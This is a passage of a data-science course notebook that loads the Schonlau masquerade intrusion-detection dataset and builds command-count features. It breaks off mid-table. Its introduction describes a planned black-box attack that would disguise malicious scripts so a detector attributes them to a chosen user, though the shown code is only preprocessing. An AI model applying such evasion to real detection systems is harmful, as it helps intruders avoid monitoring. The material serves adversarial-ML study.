{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "daniel-jones-documentation.ipynb",
      "version": "0.3.2",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    }
  },
  "cells": [
    {
      "metadata": {
        "id": "9buGoGYS61Ru",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "# Data Science Toolbox 4: Documentation\n",
        "_by Daniel Jones_\n",
        "\n",
        "---"
      ]
    },
    {
      "metadata": {
        "colab_type": "code",
        "id": "G0qq6bLm4rqh",
        "outputId": "ec32da28-2ba2-42cc-e2c0-7c5d47ed8f2e",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 523
        }
      },
      "cell_type": "code",
      "source": [
        "# If running on Google Colab, only cleverhans needs installation. This can be done via:\n",
        "# !pip install cleverhans\n",
        "\n",
        "# If running locally, we've listed our dependencies in requirements.txt, so the following\n",
        "# should get everything up and running:\n",
        "# !pip install -r requirements.txt\n",
        "\n",
        "import numpy\n",
        "import keras\n",
        "import pandas\n",
        "import requests\n",
        "import io\n",
        "import zipfile\n",
        "import os\n",
        "import re\n",
        "import cleverhans\n",
        "import tensorflow\n",
        "import seaborn\n",
        "import sklearn\n",
        "\n",
        "from cleverhans.attacks import FastGradientMethod\n",
        "from cleverhans.attacks import CarliniWagnerL2\n",
        "from cleverhans.attacks import SaliencyMapMethod\n",
        "from cleverhans.attacks_tf import jacobian_augmentation\n",
        "from cleverhans.attacks_tf import jacobian_graph\n",
        "from cleverhans.loss import CrossEntropy\n",
        "from cleverhans.train import train\n",
        "from cleverhans.utils_keras import KerasModelWrapper\n",
        "from cleverhans.utils_tf import model_eval\n",
        "\n",
        "from keras.models import Sequential\n",
        "from keras.layers import Dense\n",
        "\n",
        "numpy.random.seed(0xC0FFEE)\n",
        "tensorflow.set_random_seed(0xC0FFEE)\n",
        "rng = numpy.random.RandomState(0xC0FFEE)"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Collecting cleverhans\n",
            "\u001b[?25l  Downloading https://files.pythonhosted.org/packages/ac/a0/f0b4386b719f343c4ed3e13cd7792a7a7a4674566ca9b2b34a09b7424220/cleverhans-3.0.1-py3-none-any.whl (198kB)\n",
            "\u001b[K    100% |████████████████████████████████| 204kB 11.0MB/s \n",
            "\u001b[?25hRequirement already satisfied: scipy in /usr/local/lib/python3.6/dist-packages (from cleverhans) (1.1.0)\n",
            "Requirement already satisfied: numpy in /usr/local/lib/python3.6/dist-packages (from cleverhans) (1.14.6)\n",
            "Collecting pycodestyle (from cleverhans)\n",
            "\u001b[?25l  Downloading https://files.pythonhosted.org/packages/0e/0c/04a353e104d2f324f8ee5f4b32012618c1c86dd79e52a433b64fceed511b/pycodestyle-2.5.0-py2.py3-none-any.whl (51kB)\n",
            "\u001b[K    100% |████████████████████████████████| 51kB 10.0MB/s \n",
            "\u001b[?25hCollecting mnist~=0.2 (from cleverhans)\n",
            "  Downloading https://files.pythonhosted.org/packages/c6/c4/5db3bfe009f8d71f1d532bbadbd0ec203764bba3a469e4703a889db8e5e0/mnist-0.2.2-py2.py3-none-any.whl\n",
            "Requirement already satisfied: tensorflow-probability in /usr/local/lib/python3.6/dist-packages (from cleverhans) (0.6.0)\n",
            "Requirement already satisfied: nose in /usr/local/lib/python3.6/dist-packages (from cleverhans) (1.3.7)\n",
            "Requirement already satisfied: matplotlib in /usr/local/lib/python3.6/dist-packages (from cleverhans) (3.0.3)\n",
            "Requirement already satisfied: six>=1.10.0 in /usr/local/lib/python3.6/dist-packages (from tensorflow-probability->cleverhans) (1.11.0)\n",
            "Requirement already satisfied: python-dateutil>=2.1 in /usr/local/lib/python3.6/dist-packages (from matplotlib->cleverhans) (2.5.3)\n",
            "Requirement already satisfied: pyparsing!=2.0.4,!=2.1.2,!=2.1.6,>=2.0.1 in /usr/local/lib/python3.6/dist-packages (from matplotlib->cleverhans) (2.3.1)\n",
            "Requirement already satisfied: cycler>=0.10 in /usr/local/lib/python3.6/dist-packages (from matplotlib->cleverhans) (0.10.0)\n",
            "Requirement already satisfied: kiwisolver>=1.0.1 in /usr/local/lib/python3.6/dist-packages (from matplotlib->cleverhans) (1.0.1)\n",
            "Requirement already satisfied: setuptools in /usr/local/lib/python3.6/dist-packages (from kiwisolver>=1.0.1->matplotlib->cleverhans) (40.8.0)\n",
            "Installing collected packages: pycodestyle, mnist, cleverhans\n",
            "Successfully installed cleverhans-3.0.1 mnist-0.2.2 pycodestyle-2.5.0\n",
            "\n",
            "WARNING: The TensorFlow contrib module will not be included in TensorFlow 2.0.\n",
            "For more information, please see:\n",
            "  * https://github.com/tensorflow/community/blob/master/rfcs/20180907-contrib-sunset.md\n",
            "  * https://github.com/tensorflow/addons\n",
            "If you depend on functionality not listed there, please file an issue.\n",
            "\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "metadata": {
        "id": "ryjxHLD70y3m",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "The code in this notebook goes through the process of:\n",
        "  1. Building a model.\n",
        "  2. Replicating it using Jacobian Augmentation under a black-box attack model.\n",
        "  3. Building adversarial examples.\n",
        "  4. Developing an end-to-end attack which takes in a malicious script and will output an equivelant script which is classified as the target user specified.\n",
        "  \n",
        "**NOTE:** There is some randomness in this notebook which we haven't been able to get rid of (despite all those random we seeds we set at the top). Many of our results (from the surrogate onwards) can differ by a percent or so in either direction. Nonetheless, our analysis does still hold (e.g. the surrogate has consistently replicated the oracle better than it does predict correct labels everytime we've run this notebook)."
      ]
    },
    {
      "metadata": {
        "colab_type": "text",
        "id": "guBl1hnUsmNf"
      },
      "cell_type": "markdown",
      "source": [
        "# Dataset"
      ]
    },
    {
      "metadata": {
        "colab_type": "text",
        "id": "GS0WJpSyuQeU"
      },
      "cell_type": "markdown",
      "source": [
        "## Loading data"
      ]
    },
    {
      "metadata": {
        "colab_type": "text",
        "id": "OlTdMqCWus2I"
      },
      "cell_type": "markdown",
      "source": [
        "Run the below code to download a copy of the dataset (if you don't already have it):"
      ]
    },
    {
      "metadata": {
        "colab_type": "code",
        "id": "fLKVLsJFurZ5",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "response = requests.get(\"http://www.schonlau.net/masquerade/masquerade-data.zip\")\n",
        "\n",
        "dataset_file = io.BytesIO(response.content)\n",
        "\n",
        "zipped_dataset = zipfile.ZipFile(dataset_file)\n",
        "zipped_dataset.extractall('data/masquerade-data')"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "colab_type": "code",
        "id": "gIA5snRclpjq",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "# http://www.schonlau.net/intrusion.html\n",
        "# download Masquerade Data (zip File)\n",
        "\n",
        "import pandas as pd\n",
        "directory = './data/masquerade-data'"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "colab_type": "text",
        "id": "xOhVC6HazrjI"
      },
      "cell_type": "markdown",
      "source": [
        "We've loaded in the dataset, but need to do a little coercion to get it into the required format. First, we make sure  the values in the dataframe are categorical variables sharing the same data type:"
      ]
    },
    {
      "metadata": {
        "colab_type": "code",
        "id": "5vklxycDrRYm",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "commands = numpy.unique(df)\n",
        "command_dtype = pandas.api.types.CategoricalDtype(commands)\n",
        "\n",
        "for column in df:\n",
        "    df[column] = df[column].astype(command_dtype)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "colab_type": "code",
        "id": "kO_pHxcslplN",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "labelled, unlabelled = df.head(5000), df.tail(len(df) - 5000)  # ignore unlabeled"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "colab_type": "text",
        "id": "ZEH_Lws_op3_"
      },
      "cell_type": "markdown",
      "source": [
        "The dataset contains a list of commands run for each user. Treating this as a timeseries, we perform rolling window sampling in blocks of 100 commands, and summarise the usage over each block."
      ]
    },
    {
      "metadata": {
        "colab_type": "code",
        "id": "co7TNH4XqLYG",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "def rolling_window_command_counts(commands, window_size):\n",
        "    \n",
        "    # Save a copy the name of the series to add again to our output. This will preserve the mapping of\n",
        "    # user identifier to (it's column header in the dataframe it came from), which in\n",
        "    # this case is the user identifier. \n",
        "    user = commands.name\n",
        "\n",
        "    # Convert the single column \"which command was run?\" to a column for each\n",
        "    # command, which says \"was command <x> run?\"\n",
        "    commands = pandas.get_dummies(commands)\n",
        "\n",
        "    # Take a rolling sample of the last 100 commands, then sum each \"was command <x> run?\"\n",
        "    # columns to give a bunch \"command <x> was run <y> times in this window\".\n",
        "    command_counts = commands.rolling(window=window_size).aggregate(numpy.sum)\n",
        "\n",
        "    # Remove the first 100 rows because they contain data from blocks of size < 100.\n",
        "    command_counts = command_counts[window_size-1:]\n",
        "    \n",
        "    # Preserve the user identifier (see top of function) as a new column:\n",
        "    \n",
        "    # First, a nasty hack: https://github.com/pandas-dev/pandas/issues/19136\n",
        "    command_counts = command_counts.rename(columns=str)  \n",
        "    \n",
        "    # Then, add in the user (with an adhoc parser to turn the label into a number)\n",
        "    command_counts['user'] = int(user.replace('User', ''))\n",
        "\n",
        "    return command_counts"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "tdQxI7iTQNPd",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "Apply to the entire dataset:"
      ]
    },
    {
      "metadata": {
        "colab_type": "code",
        "id": "Oiyth5e0pYSq",
        "outputId": "90fe3472-c732-4c67-ecb2-eda10f627ec9",
        "colab": {
          "base_uri": "https://localhost:8080/"
        }
      },
      "cell_type": "code",
      "source": [
        "labelled_dataset = pandas.concat([\n",
        "        rolling_window_command_counts(commands, 100)\n",
        "        for user, commands in labelled.iteritems()\n",
        "    ],\n",
        "    ignore_index=True,  # reset index to go from 0 to 4900\n",
        ")\n",
        "\n",
        "labelled_dataset"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/html": [
              "<div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>%backup%</th>\n",
              "      <th>.java_wr</th>\n",
              "      <th>.maker_w</th>\n",
              "      <th>.wrapper</th>\n",
              "      <th>.xinitrc</th>\n",
              "      <th>.xsessio</th>\n",
              "      <th>1.1</th>\n",
              "      <th>1.2</th>\n",
              "      <th>1.3</th>\n",
              "      <th>4Dwm</th>\n",
              "      <th>...</th>\n",
              "      <th>xxx</th>\n",
              "      <th>yacc</th>\n",
              "      <th>ypcat</th>\n",
              "      <th>yppasswd</th>\n",
              "      <th>z</th>\n",
              "      <th>zip</th>\n",
              "      <th>zsh</th>\n",
              "      <th>zubs</th>\n",
              "      <th>zz2</th>\n",
              "      <th>user</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>...</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>...</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>2</th>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>...</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3</th>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>...</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>4</th>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>...</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>5</th>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>...</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>6</th>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>...</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>7</th>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>...</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>8</th>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>...</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>9</th>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>...</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>10</th>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>...</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>11</th>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>...</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>12</th>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>...</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>13</th>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>...</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>14</th>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>...</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>15</th>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>...</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>16</th>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>...</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>17</th>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>...</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>18</th>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>...</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>19</th>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>...</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>20</th>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>...</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>21</th>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>...</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>22</th>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>...</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>23</th>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>...</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>24</th>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>...</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>0.0</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>25</th>\n",
              "      <td>0.0</td>\n",
